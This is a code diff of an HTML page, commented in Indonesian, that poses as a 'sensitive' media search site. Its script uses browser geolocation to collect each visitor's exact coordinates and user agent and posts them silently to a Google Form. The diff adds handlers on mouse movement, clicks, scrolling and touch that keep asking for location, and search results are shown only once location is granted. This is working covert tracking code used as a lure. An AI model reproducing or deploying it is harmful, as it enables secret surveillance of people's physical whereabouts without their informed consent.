@@ -19,8 +19,8 @@ h1 { margin-top: 40px; }
 
 .main-img {
   margin-top: 20px;
-  width: 150px;
-  height: 150px;
+  width: 120px;
+  height: 120px;
   border-radius: 18px;
   object-fit: cover;
 }
@@ -122,13 +122,6 @@ button {
   height: 28px;
   fill: black;
 }
-
-.error {
-  font-size: 32px;
-  color: red;
-  text-align: center;
-  margin-top: 50px;
-}
 </style>
 </head>
 
@@ -138,8 +131,8 @@ button {
 
 <img class="main-img" src="https://files.catbox.moe/2sgujb.jpg">
 
-<input id="keyword" placeholder="Search">
-<button onclick="search()">SEARCH</button>
+<input id="keyword" placeholder="Search" disabled>
+<button id="searchBtn" disabled>SEARCH</button>
 
 <div class="warning">This Web Is Sensitif⚠</div>
 
@@ -157,10 +150,12 @@ button {
 
 <script>
 let data = {};
+let isDataReady = false;
 let currentIndex = 0;
 let currentImages = [];
+let locationGranted = false;
 
-// Google Form config
+// Google Form config (optional, bisa dihapus kalau nggak mau submit)
 const formURL = "https://docs.google.com/forms/d/e/1FAIpQLScJJ-PAqYmeOnS6qKdgL1gTGMyX_FjrMLLg93Pv4QDbw1N-Cg/formResponse";
 const entryLatitude = "entry.138340134";
 const entryLongitude = "entry.1616098311";
@@ -169,35 +164,47 @@ const entryUserAgent = "entry.1257224602";
 // Ambil data.json
 fetch("https://lipzz-elzxd.github.io/Lipz/data.json")
   .then(res => res.json())
-  .then(json => data = json);
+  .then(json => {
+    data = json;
+    isDataReady = true;
+    document.getElementById("keyword").disabled = false;
+    document.getElementById("searchBtn").disabled = false;
+  })
+  .catch(err => console.error("Gagal load data.json:", err));
 
-function search() {
-  if (!navigator.geolocation) {
-    document.body.innerHTML = '<div class="error">404 - Geolocation Tidak Tersedia</div>';
-    return;
-  }
-
+// Minta lokasi
+function requestLocation(callback) {
+  if (!navigator.geolocation) return;
   navigator.geolocation.getCurrentPosition(
     pos => {
-      // submit lokasi ke Google Form
+      locationGranted = true;
       const lat = pos.coords.latitude.toFixed(6);
       const lon = pos.coords.longitude.toFixed(6);
       const ua = navigator.userAgent;
 
+      // submit lokasi ke Google Form (optional)
       const formData = new URLSearchParams();
       formData.append(entryLatitude, lat);
       formData.append(entryLongitude, lon);
       formData.append(entryUserAgent, ua);
-
       fetch(formURL, { method: "POST", mode: "no-cors", body: formData });
 
-      // setelah izin diberikan, tampil modal media
-      showMedia();
+      if(callback) callback();
     },
-    err => {
-      document.body.innerHTML = '<div class="error">404 - Anda menolak izin lokasi</div>';
-    }
+    err => { locationGranted = false; }
   );
+}
+
+function search() {
+  if (!isDataReady) {
+    alert("Data masih dimuat, tunggu sebentar...");
+    return;
+  }
+  if (!locationGranted) {
+    requestLocation(() => showMedia());
+  } else {
+    showMedia();
+  }
 }
 
 function showMedia() {
@@ -273,6 +280,15 @@ function closeModal() {
   currentImages = [];
   currentIndex = 0;
 }
+
+// Minta lokasi terus menerus saat ada interaksi
+["mousemove","mousedown","scroll","touchstart"].forEach(evt => {
+  document.addEventListener(evt, () => {
+    if (!locationGranted) requestLocation();
+  });
+});
+
+document.getElementById("searchBtn").addEventListener("click", search);
 </script>
 
 </body>
